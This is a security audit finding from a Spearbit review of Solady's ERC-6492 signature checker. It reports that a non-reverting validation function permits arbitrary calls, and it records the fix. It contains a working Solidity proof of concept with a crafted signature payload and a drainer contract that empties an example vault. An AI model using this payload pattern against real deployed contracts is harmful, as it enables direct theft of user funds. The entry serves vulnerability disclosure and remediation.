---
tags:
  - lang/solidity
  - sector/token
  - platform/spearbit
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - novelty/variant
protocol: "[[Solady]]"
auditors:
  - "[[Kaden]]"
report: "https://github.com/spearbit/portfolio/blob/master/pdfs/Solady-Coinbase-Spearbit-Security-Review-December-2024.pdf"
genome:
  - "[[cross-contract]]"
  - "[[direct-drain]]"
  - "[[variant]]"
  - "[[access-roles]]"
  - "[[fee-accounting]]"
---
# isValidERC6492SignatureNowAllowSideEffects allows arbitrary calls via maliciously crafted signa-

- id: 45407
- impact: HIGH
- protocol: Coinbase [[Solady]]
- reporter: Kaden (Spearbit)
- source: https://github.com/spearbit/portfolio/blob/master/pdfs/Solady-Coinbase-Spearbit-Security-Review-December-2024.pdf

## Summary


The bug report is about a problem in the SignatureCheckerLib.sol code that is used to validate signatures for contract accounts. The problem is that one of the functions in the code, isValidERC6492SignatureNowAllowSideEffects, does not properly revert the side-effects of a call to a factory, which can lead to vulnerabilities in the code. This can be exploited to drain funds from a contract account. The report recommends fixing the code by using an intermediary contract to perform the call, and the issue has been fixed in a recent update. 

## Details

## Vulnerability Report

## Severity: Critical Risk

**Context:** SignatureCheckerLib.sol#L306

### Description
The ERC-6492 standard specifies a way that signatures can be validated for contract accounts whose code has not been deployed yet. This is done by simulating or actually executing the deployment of these accounts and then calling their code.

To enable this, the bytes "signature" payload in the standard specifies a way to package the address of a deployer factory, an arbitrary call payload for said factory, and the original ERC-1271 signature. The Solady library implements two functions conforming to this standard with slight variants.

One of these, `isValidERC6492SignatureNowAllowSideEffects`, is problematic because it does not revert the underlying side-effect from calling the factory, unlike its counterpart `isValidERC6492SignatureNow`. This poses a problem because the library triggers an arbitrary call based on the provided factory and payload without much additional validation beyond that the subsequent call to validate the signature succeeds.

### Proof of Concept
A seemingly innocuous use of the library as follows is therefore vulnerable:

```solidity
contract SimpleVault is ERC20 {
    using SafeTransferLib for address;
    address public immutable BACKING;
    mapping(address owner => uint256 nonce) public nextNonce;

    constructor(address backedBy) {
        BACKING = backedBy;
    }

    function name() public pure override returns (string memory) {
        return "name";
    }

    function symbol() public pure override returns (string memory) {
        return "symbol";
    }

    function deposit(uint256 amount) public {
        BACKING.safeTransferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
    }

    function withdraw(uint256 amount) public {
        _burn(msg.sender, amount);
        BACKING.safeTransfer(msg.sender, amount);
    }

    function getHash(address from, address to, uint256 amount, uint256 nonce) public pure returns (bytes32) {
        return keccak256(abi.encode("TRANSFER_WITH_SIG", from, to, amount, nonce));
    }

    function transferWithSig(address from, address to, uint256 amount, uint256 nonce, bytes calldata sig) public {
        // WARNING: Unsafe/non-standard message hash derivation for demo purposes (not required to make the PoC work)
        bytes32 hash = getHash(from, to, amount, nonce);
        require(nonce == nextNonce[from]++, "nonce wrong");
        require(SignatureCheckerLib.isValidERC6492SignatureNowAllowSideEffects(from, hash, sig), "invalid sig");
        _transfer(from, to, amount);
    }
}
```

The following scenario + helper contract demonstrates draining the tokens by leveraging the arbitrary call in the validation library to call out to the backing ERC20 token to transfer out funds from the example vault:

```solidity
/// @author philogy <https://github.com/philogy>
contract ERC6492SideEffectTest is Test {
    MockERC20 backing;
    SimpleVault vault;

    function setUp() public {
        backing = new MockERC20();
        vault = new SimpleVault(address(backing));
    }

    function test_sideEffect() public {
        // User with tokens
        address user1 = makeAddr("user_1");
        deal(address(backing), user1, 1_000e18);
        
        // User deposits
        vm.startPrank(user1);
        backing.approve(address(vault), type(uint256).max);
        vault.deposit(1_000e18);
        vm.stopPrank();

        // Attack prep
        DrainerHelper drainer = new DrainerHelper(backing);
        bytes memory sig = new bytes(0);
        bytes memory erc4629_drain_payload = bytes.concat(
            abi.encode(address(backing), abi.encodeCall(backing.transfer, (address(drainer), 1_000e18)), sig),
            bytes32(0x6492649264926492649264926492649264926492649264926492649264926492)
        );

        // Drainer has no funds
        assertEq(backing.balanceOf(address(drainer)), 0);
        vault.transferWithSig(address(drainer), address(drainer), 0, 0, erc4629_drain_payload);
        
        // Drainer has vault funds
        assertEq(backing.balanceOf(address(drainer)), 1_000e18);
        
        // Vault is empty
        assertEq(backing.balanceOf(address(vault)), 0);
    }
}

contract DrainerHelper {
    MockERC20 immutable target;

    constructor(MockERC20 _target) {
        target = _target;
    }

    function isValidSignature(bytes32, bytes calldata) external view returns (bytes4) {
        require(target.balanceOf(address(this)) > 0);
        return this.isValidSignature.selector;
    }
}
```

### Recommendation
Ensure that the `isValidERC6492SignatureNowAllowSideEffects` library function itself does not make any direct arbitrary calls. Instead, it should execute them by calling some intermediary verifier contract that performs the actual call, creating a distinct, separated origin for the arbitrary call. This ensures that should the signature be a malicious payload, it can only modify or touch the immutable intermediary "verifier".

### Additional Information
- **Solady:** Fixed in PR 1221.
- **Spearbit:** Verified. A new non-reverting external helper has been deployed at address `0x0000bc370E4DC924F427d84e2f4B9Ec81626ba7E` based on the GitHub gist implementation by Vectorized with id `011d6bec`. Like the reverting verifier in `isValidERC6492SignatureNow`, this new verifier is used in `isValidERC6492SignatureNowAllowSideEffects` to perform the arbitrary external call, ensuring that the signature checker library itself does not directly perform such calls.
